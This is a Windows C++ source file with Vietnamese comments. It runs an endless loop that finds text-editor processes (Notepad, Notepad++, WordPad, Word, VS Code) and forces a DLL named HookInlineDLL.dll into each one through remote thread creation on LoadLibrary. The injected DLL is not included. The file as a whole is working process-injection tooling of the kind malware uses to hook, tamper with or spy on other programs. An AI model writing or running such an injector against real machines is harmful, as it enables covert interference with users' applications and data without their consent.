#include <windows.h>
#include <iostream>
#include <tlhelp32.h>
#include <tchar.h>
#include <psapi.h>
#include <memoryapi.h>
#include <processthreadsapi.h>
#include <shlwapi.h>
#pragma comment(lib, "Shlwapi.lib")
#define UNICODE
#define _UNICODE

int injectDLL(const TCHAR* dllPath, DWORD pid) {
    // mo process voi full quyen access
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        _tprintf(TEXT("Can't open process, error code: %d\n"), GetLastError());
        return 0;
    }
    // cap phat bo nho trong process muc tieu de inject dllPath
    LPVOID injectAddr = VirtualAllocEx(hProcess, NULL, (_tcslen(dllPath) + 1) * sizeof(TCHAR), MEM_COMMIT, PAGE_READWRITE);
    if (!injectAddr) {
        _tprintf(TEXT("Failed to allocate memory, error code: %d\n"), GetLastError());
        CloseHandle(hProcess);
        return 0;
    }
    //ghi dllPath vao bo nho vua cap phat
    if (!WriteProcessMemory(hProcess, injectAddr, dllPath, (_tcslen(dllPath) + 1) * sizeof(TCHAR), NULL)) {
        _tprintf(TEXT("Failed to write memory, error code: %d\n"), GetLastError());
        VirtualFreeEx(hProcess, injectAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 0;
    }

#ifdef UNICODE
    LPCSTR loadFunc = "LoadLibraryW";
#else
    LPCSTR loadFunc = "LoadLibraryA";
#endif

    LPVOID loadLibraryAddr = GetProcAddress(GetModuleHandleA("kernel32.dll"), loadFunc);
    if (!loadLibraryAddr) {
        _tprintf(TEXT("Failed to get address of %s, error code: %d\n"), LPCWSTR(loadFunc), GetLastError());
        VirtualFreeEx(hProcess, injectAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 0;
    }
    // tao luong trong process muc tieu, thuc thi func tai loadlibraryAddr
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, injectAddr, 0, NULL);
    if (!hThread) {
        _tprintf(TEXT("Failed to create remote thread, error code: %d\n"), GetLastError());
        VirtualFreeEx(hProcess, injectAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 0;
    }

    WaitForSingleObject(hThread, INFINITE);
    VirtualFreeEx(hProcess, injectAddr, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 1;
}

// ham liet ke module cua process
int checkmodule(DWORD processID, const TCHAR* moduleName) {
    {
        HMODULE hMods[1024];
        HANDLE hProcess; 
        DWORD cbNeeded;

        hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
        if (hProcess == NULL) {
            _tprintf(TEXT("OpenProcess failed (%lu)\n"), GetLastError());
            return 0;
        }

        if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded))
        {
            for (UINT i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
            {
                TCHAR szModName[MAX_PATH];

                if (GetModuleFileNameEx(hProcess, hMods[i], szModName, MAX_PATH))
                {
                    // lay ten file khong bao gom duong dan
                    const TCHAR* baseName = _tcsrchr(szModName, TEXT('\\'));
                    baseName = (baseName) ? baseName + 1 : szModName;

                    if (_tcsicmp(baseName, moduleName) == 0) {
                        CloseHandle(hProcess);
                        return 1; 
                    }
                }
            }
        }

        CloseHandle(hProcess);
        return false;
    }
}
int _tmain() {
    // lay path dll nam cung voi file exe hien tai
    TCHAR dllPath[MAX_PATH];
    GetModuleFileName(NULL, dllPath, MAX_PATH);
    PathRemoveFileSpec(dllPath); 
    _tcscat_s(dllPath, TEXT("\\HookInlineDLL.dll")); 
    while (1) {
        // list process
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) {
            _tprintf(TEXT("Failed to take handle snapshot, error code: %d\n"), GetLastError());
            return 0;
        }

        PROCESSENTRY32 pe64 = { sizeof(PROCESSENTRY32) };
        if (Process32First(hSnapshot, &pe64)) {
            do {
                // so sanh ten process voi cac process thuong dung de mo txt
                if (!_tcsicmp(pe64.szExeFile, TEXT("notepad.exe")) ||
                    !_tcsicmp(pe64.szExeFile, TEXT("notepad++.exe")) ||
                    !_tcsicmp(pe64.szExeFile, TEXT("wordpad.exe")) ||
                    !_tcsicmp(pe64.szExeFile, TEXT("WINWORD.exe")) ||
                    !_tcsicmp(pe64.szExeFile, TEXT("Code.exe"))) {
                    //neu process chua duoc inject dll -> injectDLL
                    if (!checkmodule(pe64.th32ProcessID, TEXT("HookInlineDLL.dll"))) {
                        int inject = injectDLL(dllPath, pe64.th32ProcessID);
                        if(inject)
                            _tprintf(TEXT("Inject success for PID: %d\n"), pe64.th32ProcessID);
                    }
                }
            } while (Process32Next(hSnapshot, &pe64));
        }
        CloseHandle(hSnapshot);
        Sleep(5000);
    }
    return 0;
}
